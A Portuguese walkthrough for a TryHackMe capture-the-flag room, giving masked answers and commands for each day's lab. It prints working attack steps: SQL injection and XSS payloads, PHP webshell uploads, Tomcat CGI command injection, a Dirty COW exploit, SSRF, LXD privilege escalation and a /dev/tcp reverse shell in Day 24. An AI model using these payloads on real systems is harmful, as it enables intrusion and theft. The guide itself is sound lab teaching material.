# Guia de resolução: 25 Days of Cyber Security

> **Este guia mostra como obter as respostas, sem revelá-las.** [Abrir a sala no TryHackMe](https://tryhackme.com/room/learncyberin25days). O endereço da máquina muda a cada implantação: substitua `<IP>` pelo IP mostrado na tarefa do dia. Execute os comandos apenas nos laboratórios autorizados.

Esta sala reúne desafios conhecidos da série Advent of Cyber, mas aparece no TryHackMe com o nome **25 Days of Cyber Security**. Por isso, ela figura como extra na série deste repositório. Não há uma data de criação confirmada para esta versão da sala.

## Preparação

Use uma máquina Linux própria conectada à VPN ou a AttackBox do TryHackMe. A máquina própria é recomendada para preservar histórico, arquivos e ferramentas entre sessões; veja as [opções de máquina de ataque](../../../README.md#máquina-local-conectada-à-vpn). Tenha `nmap`, `curl`, `python3`, `ffuf` ou `gobuster`, `tshark`, `smbclient`, `enum4linux`, `sshpass`, `exiftool`, `radare2` e `gdb` à mão. Para as VMs Windows, use RDP e as credenciais informadas na própria tarefa. Algumas máquinas levam vários minutos para liberar as portas, e o IP pode demorar cerca de um minuto para aparecer.

```bash
export IP=<IP_DA_LAB_MACHINE>
nmap -Pn -sT -p- --min-rate 1000 --open "$IP"
```

As tarefas 1 e 2 introduzem a sala; o dia 1 começa na tarefa 3. Nos dias sem máquina, use somente o arquivo fornecido ou a pesquisa indicada. Quando houver uma pergunta **No answer needed**, conclua o procedimento e clique em **Check**. Aguarde alguns segundos entre envios.

Nas máscaras de resposta, `...` representa caracteres omitidos e `#` representa um dígito. Textos com cinco caracteres ou mais mostram os três primeiros; textos menores mostram os dois primeiros. Para flags, mostro apenas o prefixo e as chaves.

## Dia 1 - A Christmas Crisis

1. Abra `http://<IP>` e observe as chamadas à API no código JavaScript ou nas ferramentas do navegador. Registre uma conta de laboratório pelo endpoint de cadastro e faça login.
2. Localize o cookie de autenticação. Decodifique-o primeiro de hexadecimal e depois leia o JSON resultante. O campo `username` controla a identidade aceita pela aplicação.
3. Troque somente o usuário do JSON para o nome de Santa, codifique em hexadecimal e substitua o valor do cookie. Recarregue a página.
4. No **Control Console**, acione todos os serviços, inclusive o último. A resposta aparece no retorno da chamada à API.

```python
import json

cookie = "<COOKIE_COPIADO>"
data = json.loads(bytes.fromhex(cookie).decode())
print(data)
data["username"] = "santa"
print(json.dumps(data, separators=(",", ":")).encode().hex())
```

No painel de rede, procure as requisições de `/api/adduser`, `/api/login` e `/api/service`. O serviço final revela a flag depois que os demais estiverem ativos.

**Respostas:** `aut...` (cookie); `Hex...` (codificação); `JS...` (estrutura); `7b2...` (cookie alterado em hexadecimal); `THM{...}` (flag).

## Dia 2 - The Elf Strikes Back!

1. Leia o código-fonte e os comentários da página inicial. O parâmetro `id` indicado ali, com valor em Base64, abre a página de upload.
2. Teste um arquivo de imagem comum para identificar o tipo aceito. Enumere os diretórios públicos para encontrar onde o servidor grava uploads.
3. O bloqueio do lado do cliente não protege o servidor. Envie um arquivo de laboratório com dupla extensão, começando por uma extensão de imagem e terminando em `.php`, usando a requisição observada no navegador.
4. Acesse o arquivo enviado, confirme a execução de `id` e então leia o arquivo de flag mencionado na pergunta. Apague o arquivo enviado ao terminar.

```bash
gobuster dir -u "http://$IP/" -w /usr/share/wordlists/dirb/common.txt
curl "http://$IP/?id=<VALOR_BASE64_ENCONTRADO>"
curl "http://$IP/<DIRETORIO_DE_UPLOAD>/<ARQUIVO>.jpg.php?cmd=id"
```

O endpoint `/upload` recebe JSON com `name`, `id`, `mime` e `body`; o corpo do arquivo é um Data URL em Base64. Mantenha os dados da requisição original e altere apenas o arquivo necessário.

**Respostas:** `?id...` (parâmetro); `Ima...` (tipo); `/upl...` (diretório); `THM{...}` (flag).

## Dia 3 - Christmas Chaos

1. Examine o formulário de login e as nove combinações de usuário e senha fornecidas na tarefa.
2. Teste cada combinação com uma sessão HTTP. O par correto redireciona para outra página; acompanhe esse redirecionamento e leia a flag exibida.

```python
import requests

s = requests.Session()
for user, password in <LISTA_DE_PARES_DA_TAREFA>:
    r = s.post(f"http://<IP>/login", data={"username": user, "password": password})
    print(user, password, r.url, r.status_code)
```

**Respostas:** `adm...` (usuário); `THM{...}` (flag).

## Dia 4 - Santa's Watching

1. Leia o exemplo de `wfuzz` da lição para montar o comando conceitual pedido na primeira pergunta. Use o parâmetro `breed` no domínio de exemplo, sem varrer um serviço externo real.
2. No alvo da sala, enumere os diretórios e abra o índice do diretório da API. Ali aparece o arquivo PHP que recebe uma data.
3. Baixe a lista de datas disponibilizada pela tarefa. Teste as datas no parâmetro `date`, ocultando respostas vazias. Abra diretamente a data que retornou conteúdo e leia a flag.

```bash
gobuster dir -u "http://$IP/" -w /usr/share/wordlists/dirb/common.txt
wfuzz -c -z file,<LISTA_DE_DATAS> --hh 0 \
  "http://$IP/<DIRETORIO_API>/<PAGINA_PHP>?date=FUZZ"
```

**Respostas:** `wfu...` (comando); `sit...` (arquivo); `THM{...}` (flag).

## Dia 5 - Someone Stole Santa's Gift List!

1. Espere a aplicação iniciar na porta `8000`. O painel de Santa está em uma rota que pode ser inferida do HTML e do contexto, sem enumeração de diretórios.
2. Inspecione o formulário de login. Uma injeção de SQL no campo de usuário permite acessar o painel. Guarde o cookie de sessão para as buscas seguintes.
3. Uma busca ampla mostra o total de presentes e o pedido de Paul. Depois, explore o parâmetro `search` com `UNION SELECT` para listar o esquema SQLite, a tabela oculta e as contas.

```bash
curl -c cookies.txt -b cookies.txt -X POST \
  -d "username=<INJECAO_DE_LOGIN>&password=x" \
  "http://$IP:8000/<PAINEL_DE_SANTA>"
curl -b cookies.txt -G --data-urlencode "search=%" \
  "http://$IP:8000/<PAGINA_DE_BUSCA>"
curl -b cookies.txt -G \
  --data-urlencode "search=' UNION SELECT name,sql FROM sqlite_master--" \
  "http://$IP:8000/<PAGINA_DE_BUSCA>"
```

Use a quantidade de colunas e os nomes das tabelas revelados pelo esquema para adaptar a consulta `UNION SELECT` e obter a flag e a senha pedidas. Apague o arquivo de cookies depois.

**Respostas:** `/san...` (painel); `##` (quantidade); `git...` (pedido de Paul); `thmfox{...}` (flag); `EhC...` (senha).

## Dia 6 - Be Careful With What You Wish on a Christmas Night

1. Abra a aplicação na porta indicada pela tarefa e identifique o parâmetro de busca e o formulário de comentários.
2. Envie um pequeno teste de JavaScript na busca e veja se ele retorna sem codificação. Isso demonstra XSS refletido.
3. Envie um teste semelhante pelo formulário de comentário. Abra a página novamente para verificar se o código permanece: esse é o caso armazenado.
4. Use OWASP ZAP ou as ferramentas do navegador para conferir os tipos de alerta solicitados nas perguntas. Não mantenha os comentários de teste após o exercício, se a aplicação permitir removê-los.

```bash
curl -G --data-urlencode 'q=<script>alert(1)</script>' \
  "http://$IP:<PORTA>/"
```

**Respostas:** `ref...` (tipo da busca); `sto...` (tipo do comentário); `XSS...` (alerta); `#` (quantidade solicitada).

## Dia 7 - The Grinch Really Did Steal Christmas

1. Baixe o ZIP da própria tarefa e extraia os três PCAPs. Não há máquina alvo para iniciar.
2. Em `pcap1.pcap`, filtre ICMP para achar o emissor do ping. Depois filtre requisições HTTP GET do IP citado na pergunta e leia o caminho do artigo.
3. Em `pcap2.pcap`, siga o fluxo FTP e procure o comando `PASS`; as estatísticas de protocolos mostram qual tráfego está cifrado.
4. Em `pcap3.pcap`, exporte os objetos HTTP, extraia o ZIP encontrado e leia a lista de desejos.

```bash
tshark -r pcap1.pcap -Y icmp -T fields -e ip.src -e ip.dst
tshark -r pcap1.pcap \
  -Y 'http.request.method == GET && ip.src == <IP_DA_PERGUNTA>' \
  -T fields -e http.request.uri
tshark -r pcap2.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg
tshark -r pcap2.pcap -q -z io,phs
mkdir -p objects
tshark -r pcap3.pcap --export-objects http,objects
```

**Respostas:** `##.##.#.#` (IP); `htt...` (filtro); `rei...` (artigo); `pla...` (senha); `SS...` (protocolo); `Rub...` (presente).

## Dia 8 - What's Under the Christmas Tree?

1. Faça uma varredura completa de portas. Repita `-sV`, detecção de sistema operacional e scripts apropriados apenas nas portas abertas.
2. Compare os banners HTTP e SSH com a identificação do Linux. A página HTTP revela a função do servidor no título.
3. Consulte a fonte oficial do Snort para o ano de criação solicitado na pergunta teórica.

```bash
nmap -Pn -sT -p- --min-rate 1000 --open "$IP"
sudo nmap -Pn -sS -sV -O \
  --script http-title,ssh-hostkey,rdp-ntlm-info \
  -p <PORTAS_ABERTAS> "$IP"
```

**Respostas:** `####` (ano); `##,####,####` (portas); `ubu...` (distribuição); `blo...` (função).

## Dia 9 - Anyone Can Be Santa!

1. Enumere FTP e tente o acesso anônimo. Percorra os diretórios para encontrar a lista de compras e um script de backup.
2. Leia o script antes de alterá-lo: ele copia conteúdo do FTP com privilégios elevados em uma tarefa agendada. Identifique o local de destino e a frequência de execução.
3. Em uma cópia de laboratório, acrescente ao script uma linha que copie a flag de `/root` para um diretório FTP legível e ajuste sua permissão. Envie a alteração, aguarde a execução agendada e leia a cópia da flag pelo FTP.
4. Restaure o script original e remova a cópia temporária da flag.

```bash
ftp "$IP"
# Use anonymous as the login name.
```

Para automatizar, `ftplib.FTP(...).login()` oferece `nlst`, `retrbinary` e `storbinary`. Guarde os bytes originais do script antes do envio.

**Respostas:** `ftp...` (serviço); `The...` (item da lista); `THM{...}` (flag).

## Dia 10 - Don't Be sElfish!

1. Enumere contas e compartilhamentos SMB com `enum4linux`. Conte somente as contas e shares solicitados.
2. Teste acesso sem senha ao share de Santa. Liste arquivos e diretórios e leia a nota para confirmar que é o compartilhamento correto.

```bash
enum4linux -U -S "$IP"
smbclient "//$IP/<SHARE_DE_SANTA>" -N -c 'ls'
smbclient "//$IP/<SHARE_DE_SANTA>" -N -c 'get <NOTA> -'
```

**Respostas:** `#` (contas); `#` (shares); `tbf...` (share); `jin...` (diretório).

## Dia 11 - The Rogue Gnome

1. Responda às perguntas conceituais sobre escalada de privilégios e o arquivo que define acesso a `sudo`.
2. Entre por SSH com as credenciais dadas na tarefa. Procure executáveis SUID. Observe se algum shell possui esse bit.
3. Inicie o shell com `-p` para preservar o UID efetivo. Confirme a identidade com `id` e leia o arquivo de flag em `/root`.

```bash
ssh <USUARIO_DA_TAREFA>@"$IP"
find / -perm -4000 -type f 2>/dev/null
/bin/bash -p -c 'id; cat /root/flag.txt'
```

**Respostas:** `ver...` (tipo); `sud...` (arquivo); `ba...` (binário SUID); `thm{...}` (flag).

## Dia 12 - Ready, Set, Elf.

1. Aguarde o Tomcat na porta `8080` e leia o banner e a página inicial para obter a versão.
2. Examine o CGI `.bat` e associe a versão do Tomcat à vulnerabilidade de execução de comandos descrita na tarefa.
3. Faça uma prova com `whoami`. Para comandos com espaço na query string desse CGI, use `+`; `%20` pode não funcionar neste ambiente.
4. Liste o diretório CGI e leia `flag1.txt` com `type`.

```bash
curl -i "http://$IP:8080/"
curl -i "http://$IP:8080/cgi-bin/<SCRIPT>.bat?&whoami"
curl -i "http://$IP:8080/cgi-bin/<SCRIPT>.bat?&dir"
curl -i "http://$IP:8080/cgi-bin/<SCRIPT>.bat?&type+flag1.txt"
```

**Respostas:** `9.0...` (Tomcat); `CVE-####-####` (vulnerabilidade); `thm{...}` (flag).

## Dia 13 - Coal for Christmas

1. Varra o alvo e identifique o serviço remoto antigo, além de SSH. Leia o banner e entre com as credenciais deixadas na própria tarefa.
2. Leia `/etc/lsb-release` para descobrir a distribuição e a versão. O arquivo `cookies_and_milk.txt` na home contém a pista sobre quem chegou antes e trechos do código explorado na lição.
3. Encontre o código completo da prova de conceito na instalação do ExploitDB da Kali. Transfira-o para `/tmp` do alvo e compile com as opções de thread e biblioteca criptográfica indicadas no comentário do arquivo.
4. Execute a prova de conceito somente nessa VM de laboratório, com uma senha temporária. Verifique o UID da conta criada, acesse `/root/message_from_the_grinch.txt` e siga a instrução do arquivo para calcular o MD5 da saída de `tree`.
5. Restaure `/etc/passwd` usando o backup criado pelo exploit e remova os binários temporários.

```bash
nmap -Pn -sT -sV -p 22,23,111 "$IP"
telnet "$IP"
cat /etc/lsb-release
cat ~/cookies_and_milk.txt
scp /usr/share/exploitdb/exploits/linux/local/40839.c \
  <USUARIO>@"$IP":/tmp/dirty.c
gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt
/tmp/dirty <SENHA_TEMPORARIA>
id
cat /root/message_from_the_grinch.txt
tree | md5sum
```

A compilação e a execução acima ocorrem na VM depois da transferência; se usar sessões separadas, entre nela novamente por SSH. Confira o nome do backup de `/etc/passwd` criado pela prova de conceito antes de restaurar.

**Respostas:** `tel...` (protocolo); `cla...` (credencial encontrada); `Ubu...` (sistema); `gri...` (assinatura); `gcc...` (compilação); `8b1...` (MD5).

## Dia 14 - Where's Rudolph?

Esta tarefa é OSINT; não precisa iniciar uma Lab Machine.

1. Abra o histórico público de comentários do perfil de Rudolph indicado no enunciado. Procure a cidade de nascimento, o primeiro nome de Robert e a plataforma social que ele menciona.
2. Verifique em uma fonte histórica quem criou Rudolph, a rena de nariz vermelho. Use o sobrenome desse autor.
3. Visite o perfil público da outra rede social e leia as postagens sobre o programa de TV e o desfile. As postagens antigas podem não aparecer na interface atual; nesse caso, use arquivos públicos ou as pistas fornecidas pela tarefa.
4. Baixe a foto original do desfile, não uma miniatura da rede social. Leia latitude, longitude e o campo `Copyright` no EXIF. Arredonde as coordenadas ao número de casas exigido pelo campo do TryHackMe.
5. Identifique o local da foto com as coordenadas e pesquise o endereço oficial do hotel citado. A última pergunta trata de uma senha de uma conta fictícia do exercício.

```bash
exiftool -n -GPSLatitude -GPSLongitude -Copyright <FOTO_ORIGINAL>
```

**Respostas:** `Chi...` (cidade); `May...` (sobrenome); `Twi...` (rede); `IGu...` (perfil); `bac...` (programa); `chi...` (desfile); `##.######, -##.######` (coordenadas); `{FLAG}...` (EXIF); `###` (número do endereço); `spy...` (senha fictícia).

## Dia 15 - There's a Python in My Stocking!

1. Leia os trechos Python da tarefa e execute cada expressão na Kali. `bool()` sobre uma string não vazia avalia verdadeiro mesmo que seu texto diga “False”.
2. Para a lista compartilhada por duas variáveis, execute exatamente a atribuição e o `append` mostrados na lição; a segunda variável aponta para o mesmo objeto.
3. Complete as perguntas conceituais sobre o repositório de pacotes e a biblioteca usada para requisições HTTP.

```bash
python3 - <<'PY'
print(True + True)
print(bool("False"))
x = [1, 2, 3]
y = x
y.append(6)
print(x)
PY
```

**Respostas:** `#` (soma); `Py...` (pacotes); `Tr...` (booleano); `req...` (HTTP); `[#,...]` (lista); `pas...` (semântica).

## Dia 16 - Help! Where Is Santa?

1. Varra o alvo e aguarde o HTTP iniciar. A página estática em `/static/index.html` contém um link para a API, que informa o diretório procurado.
2. O enunciado limita a chave a números ímpares entre 0 e 100. Consulte a rota da API com cuidado, parando ao primeiro retorno diferente da mensagem de erro. Não continue depois de encontrar a chave.

```bash
nmap -Pn -sT -p- --open "$IP"
curl -s "http://$IP/static/index.html"
python3 - <<'PY'
import urllib.request

base = "http://<IP>/api/api_key"
for key in range(1, 100, 2):
    result = urllib.request.urlopen(f"{base}?key={key}").read().decode()
    if "Key not valid" not in result:
        print(key, result)
        break
PY
```

Antes de rodar o script, substitua `<IP>` pela Lab Machine atual. Se a URL exata do endpoint diferir, copie-a do link encontrado na página.

**Respostas:** `##` (porta); `/ap...` (diretório); `Win...` (local); `##` (chave).

## Dia 17 - ReverseELFneering

1. Entre por SSH com as credenciais da tarefa e copie o binário `challenge1` para a Kali. Não execute um arquivo desconhecido no seu Windows pessoal.
2. Analise `main` no radare2: localize as escritas nas variáveis locais, o carregamento em `eax`, a multiplicação `imul` e a escrita final.
3. Se precisar confirmar o instante exato pedido por uma pergunta, coloque um breakpoint no GDB antes e depois da instrução e leia `eax` e a variável local.

```bash
scp <USUARIO_DA_TAREFA>@"$IP":~/challenge1 ./challenge1
r2 -A -q -c 'pdf @ main' ./challenge1
gdb -q ./challenge1
```

No GDB, use `disassemble main`, `break *<ENDERECO>`, `run`, `info registers eax` e `x/wd <ENDERECO_DA_VARIAVEL>`. A questão sobre `eax` espera o valor após a multiplicação, então observe a posição do breakpoint.

**Respostas:** `#` (variável inicial); `#` (registrador após multiplicação); `#` (variável final).

## Dia 18 - The Bits of Christmas

1. Entre na VM Windows por RDP com as credenciais da tarefa e abra o aplicativo do desktop no ILSpy instalado na própria VM.
2. Expanda a classe do formulário principal e examine o método do botão **Activate**. Procure a comparação de senha e a mensagem exibida no ramo de sucesso.
3. Execute o aplicativo somente na VM da sala, digite a senha que encontrou no código e confirme a mensagem com a flag.

**Respostas:** `san...` (senha); `thm{...}` (flag).

## Dia 19 - The Naughty or Nice List

1. Na página inicial, examine o parâmetro `proxy` da busca. Ele faz o servidor buscar uma URL, criando uma oportunidade de SSRF.
2. A lista interna está em um serviço local que o filtro tenta bloquear. Leia a política de domínios permitidos e use um nome DNS público que resolve para loopback dentro da própria VM, preservando o domínio aceito pelo filtro.
3. Consulte a lista interna para obter a senha de Santa. Use-a no formulário administrativo e inspecione o botão **DELETE** para encontrar a flag; não exclua registros.

```bash
curl -G --data-urlencode 'proxy=http://<DOMINIO_INTERNO>:8080/search.php?name=<NOME>' \
  "http://$IP/"
curl -G --data-urlencode 'proxy=http://<DOMINIO_PERMITIDO>.localtest.me' \
  "http://$IP/"
```

**Respostas:** `Be ...` (senha); `THM{...}` (flag).

## Dia 20 - PowershELlF to the Rescue

1. Entre na VM Windows pelo método informado na tarefa. Em PowerShell, procure arquivos ocultos em `Documents` e no desktop; leia as listas dos elfos 1 e 2.
2. Localize a pasta oculta do terceiro elfo em `C:\Windows\System32`. A busca recursiva pode demorar.
3. Conte as palavras do primeiro arquivo. Para índices numéricos, divida o texto em palavras e acesse as posições pedidas. Use as duas palavras encontradas como padrão de busca no segundo arquivo.

```powershell
Get-ChildItem "$HOME\Documents" -Force -Recurse -File
Get-ChildItem "$HOME\Desktop" -Force -Recurse
Get-ChildItem C:\Windows\System32 -Force -Directory -Recurse -ErrorAction SilentlyContinue |
  Where-Object Name -like '*3lf*'
Get-Content .\1.txt | Measure-Object -Word
$words = (Get-Content .\1.txt -Raw) -split '\s+'
$words[551]; $words[6991]
Select-String .\2.txt -Pattern '<PALAVRA_ENCONTRADA>'
```

**Respostas:** `2 f...` (elfo 1); `Scr...` (filme); `3lf...` (pasta); `####` (palavras); `Red...` (duas palavras); `Red...` (presente).

## Dia 21 - Time for Some ELForensics

1. Acesse a VM Windows por RDP e leia o texto que informa o MD5 esperado do antigo `db.exe`.
2. Calcule o MD5 do executável misterioso em `Documents`. Use uma ferramenta de strings que suporte UTF-16LE para achar a flag embutida e referências a fluxos alternativos NTFS.
3. Liste os fluxos do arquivo com `Get-Item -Stream *`. O fluxo `hidedb` contém o conector original. Extraia seus bytes para um arquivo temporário **dentro da VM isolada** e procure a última flag com `strings64.exe`, sem precisar executar o programa.

```powershell
Get-Content "$HOME\Documents\db file hash.txt"
Get-FileHash "$HOME\Documents\deebee.exe" -Algorithm MD5
C:\Tools\strings64.exe -accepteula "$HOME\Documents\deebee.exe" | Select-String 'THM\{'
Get-Item "$HOME\Documents\deebee.exe" -Stream *
$bytes = Get-Content "$HOME\Documents\deebee.exe" -Stream hidedb -Encoding Byte -ReadCount 0
[IO.File]::WriteAllBytes('C:\Users\Public\recovered-db.exe', [byte[]]$bytes)
C:\Tools\strings64.exe -accepteula C:\Users\Public\recovered-db.exe | Select-String 'THM\{'
Remove-Item C:\Users\Public\recovered-db.exe
```

O comando `strings64.exe` lê os textos embutidos; a cópia temporária é removida ao final.

**Respostas:** `596...` (MD5 esperado); `5F0...` (MD5 do arquivo atual); `THM{...}` (strings); `THM{...}` (conector).

## Dia 22 - Elf McEager Becomes CyberElf

1. Entre na VM Windows via RDP. O nome de uma pasta no desktop está codificado em Base64. Decodifique-o; o resultado é a senha do banco KeePass da tarefa.
2. Abra `Private.kdbx` no KeePass instalado na VM. No grupo **Network**, leia a nota e o valor de senha de **Elf Server**. A nota informa que o valor é hexadecimal.
3. No grupo **eMail**, a nota de **ElfMail** aponta para entidades HTML. Decodifique o valor copiado.
4. Em **Recycle Bin**, examine a entrada **Elf Security System**. Ela contém JavaScript com duas camadas de `String.fromCharCode`. Decodifique cada camada como texto para identificar o endereço oculto. Se a versão atual dessa entrada não trouxer a última flag, abra a dica da quinta pergunta na própria sala.

```bash
printf %s '<NOME_DA_PASTA>' | base64 -d
printf %s '<SENHA_HEXADECIMAL>' | xxd -r -p
python3 - <<'PY'
import html
print(html.unescape('<ENTIDADES_HTML>'))
PY
```

**Respostas:** `the...` (KeePass); `Bas...` (codificação); `sn0...` (servidor); `ic3...` (e-mail); `THM{...}` (última flag).

## Dia 23 - The Grinch Strikes Again!

1. Entre na VM Windows por RDP. Leia `RansomNote.txt` no desktop e decodifique o suposto endereço Bitcoin em Base64. Liste os documentos para identificar a nova extensão dos arquivos cifrados.
2. Abra o Agendador de Tarefas ou use PowerShell para listar tarefas que não pertencem à árvore padrão da Microsoft. Uma tarefa estranha executa um arquivo do desktop no login. Outra chama `vssadmin` com o identificador de um volume.
3. Encontre o volume **Backup** sem letra com `Get-Partition`. Ele pode ser acessado por seu caminho GUID em `AccessPaths[0]`, sem alterar a tabela de partições. Liste os arquivos ocultos para encontrar a pasta `confidential`.
4. A versão atual da pasta contém o arquivo cifrado. Use a cópia de sombra do volume para ler o `master-password.txt` anterior, sem sobrescrever arquivos.

```powershell
Get-ChildItem "$HOME\Documents" -Recurse -File -Force -ErrorAction SilentlyContinue |
  Select-Object FullName
Get-ScheduledTask |
  Where-Object TaskPath -NotLike '\Microsoft*' |
  Select-Object TaskName,TaskPath,Actions
vssadmin list volumes
vssadmin list shadows
$volume = (Get-Partition -DiskNumber 2 -PartitionNumber 1).AccessPaths[0]
Get-ChildItem -LiteralPath $volume -Force
Get-ChildItem -LiteralPath (Join-Path $volume 'confidential') -Force
$shadow = (Get-CimInstance Win32_ShadowCopy).DeviceObject
Get-Content -LiteralPath ($shadow + '\confidential\master-password.txt')
```

Se a numeração dos discos for diferente, identifique primeiro o volume **Backup** com `Get-Partition` e ajuste `-DiskNumber` e `-PartitionNumber`.

**Respostas:** `nom...` (texto Base64); `.gr...` (extensão); `opi...` (tarefa); `C:\...` (executável); `7a9...` (volume); `con...` (pasta); `m33...` (senha).

## Dia 24 - The Trial Before Christmas

1. Faça uma varredura completa. O alvo expõe dois sites: um na porta HTTP comum e outro em uma porta alta. Abra ambos e use o título do segundo para responder à pergunta do site oculto.
2. Enumere diretórios e páginas PHP no segundo site. A página de upload carrega `filter.js` e `upload.js`. O primeiro bloqueia o envio no navegador; o segundo mostra o JSON enviado a `/api/upload`.
3. Envie uma imagem de teste e confirme em qual diretório ela aparece. Depois, use um arquivo de laboratório com cabeçalho PNG válido, código PHP ao final e nome com dupla extensão `.png.php`. A primeira extensão passa pela validação de upload; a última permite execução pelo Apache. Faça uma prova com `id`.
4. Obtenha um shell interativo no alvo e leia `web.txt`. Examine os arquivos de configuração do site para achar as credenciais do banco. Com o cliente MySQL, liste o banco, suas tabelas e os hashes de usuário.
5. Teste o hash encontrado contra uma lista local como `rockyou.txt`, sem enviar o hash a serviços externos. Entre como o usuário correspondente com `su` e leia `user.txt`.
6. `id` mostra o grupo que permite gerenciar contêineres. Se a imagem Alpine já estiver importada, inicialize um contêiner privilegiado, monte a raiz do host em `/mnt/root` e leia `root.txt`. Ao final, apague o contêiner e o arquivo enviado.

```bash
nmap -Pn -sT -p- --min-rate 1000 --open "$IP"
ffuf -s -w /usr/share/wordlists/dirb/common.txt \
  -u "http://$IP:<PORTA_ALTA>/FUZZ" -fc 404
ffuf -s -w /usr/share/wordlists/dirb/common.txt \
  -u "http://$IP:<PORTA_ALTA>/FUZZ.php" -fc 404
curl -s "http://$IP:<PORTA_ALTA>/assets/js/filter.js"
curl -s "http://$IP:<PORTA_ALTA>/assets/js/upload.js"
```

O endpoint de upload espera `{"name":"<ARQUIVO>.png.php","file":"data:image/png;base64,<DADOS>"}`. O script [enviar_png_php.py](../advent-of-cyber-2020/scripts/enviar_png_php.py) gera uma imagem PNG válida, acrescenta um pequeno script PHP após o bloco `IEND`, envia o arquivo e testa sua execução com `id`. O mesmo script serve para esta sala e para a edição 2020. Instale `Pillow` e `requests` na Kali, se necessário.

```bash
cd series/advent-of-cyber/advent-of-cyber-2020
sudo apt install python3-pil python3-requests
python3 scripts/enviar_png_php.py "http://$IP:<PORTA_ALTA>"
```

O upload desta sala é público. Ajuste `--public-path` se o diretório encontrado na enumeração for diferente de `/grid/`.

Para ler a flag web e a configuração do banco, execute comandos pelo PHP enviado, usando o parâmetro `cmd`:

```bash
curl -G --data-urlencode 'cmd=cat /var/www/web.txt' \
  "http://$IP:<PORTA_ALTA>/grid/probe.png.php"
curl -G --data-urlencode 'cmd=cat /var/www/TheGrid/includes/dbauth.php' \
  "http://$IP:<PORTA_ALTA>/grid/probe.png.php"
```

Para o shell interativo, conecte sua Kali à VM apenas pela rede VPN da sala. Inicie um listener, depois peça ao PHP enviado para abrir uma conexão de retorno ao endereço VPN da sua Kali:

```bash
nc -lvnp 4444
```

Em outro terminal, substitua `<IP_VPN_KALI>` pelo endereço alcançável a partir do alvo:

```bash
curl -G --data-urlencode \
  'cmd=bash -c "bash -i >& /dev/tcp/<IP_VPN_KALI>/4444 0>&1"' \
  "http://$IP:<PORTA_ALTA>/grid/probe.png.php"
```

No shell recebido, confirme o usuário, leia a configuração e consulte o banco local:

```bash
id
cat /var/www/TheGrid/includes/dbauth.php
mysql -u<USUARIO_DB> -p
```

Dentro do MySQL, execute `show databases;`, `use <BANCO>;`, `show tables;` e `select * from users;`. Para testar o hash MD5 localmente, use [testar_hash_md5.py](../advent-of-cyber-2020/scripts/testar_hash_md5.py) com uma lista de palavras disponível na Kali:

```bash
python3 scripts/testar_hash_md5.py '<HASH_ENCONTRADO>' /usr/share/wordlists/rockyou.txt.gz
```

Depois de descobrir o usuário e a senha correspondente, prepare um PTY no shell recebido, entre no usuário e siga:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
su <USUARIO_ENCONTRADO>
id
cat ~/user.txt
lxc image list
lxc init <IMAGEM_EXISTENTE> <CONTAINER> -c security.privileged=true
lxc config device add <CONTAINER> hostfs disk source=/ path=/mnt/root recursive=true
lxc start <CONTAINER>
lxc exec <CONTAINER> -- cat /mnt/root/root/root.txt
lxc stop <CONTAINER>
lxc delete <CONTAINER>
```

**Respostas:** `##, #####` (portas); `Lig...` (site); `upl...` (PHP); `gr...` (diretório); `THM{...}` (web); `tro...` (credenciais); `tr...` (banco); `@co...` (senha); `THM{...}` (usuário); `lx...` (grupo); `THM{...}` (root).

## Tarefa 27 - Next Steps

Leia o encerramento da sala e clique em **Check** para concluir esta tarefa. Ela não pede flag nem resposta textual.
